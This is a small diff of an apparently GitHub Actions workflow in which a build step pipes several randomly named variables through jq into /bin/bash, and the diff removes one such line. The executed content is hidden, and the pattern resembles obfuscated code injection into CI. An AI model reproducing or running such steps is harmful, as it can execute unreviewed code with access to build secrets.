@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$st079" | jq -r .dxagp71704 | /bin/bash
           printf '%s' "$k3" | jq -r .wh252 | /bin/bash
-          echo $lnso852 | jq -r .o74 | /bin/bash
           echo $oa877 | jq -r .adzd691 | /bin/bash
 
       - name: Upload artifact
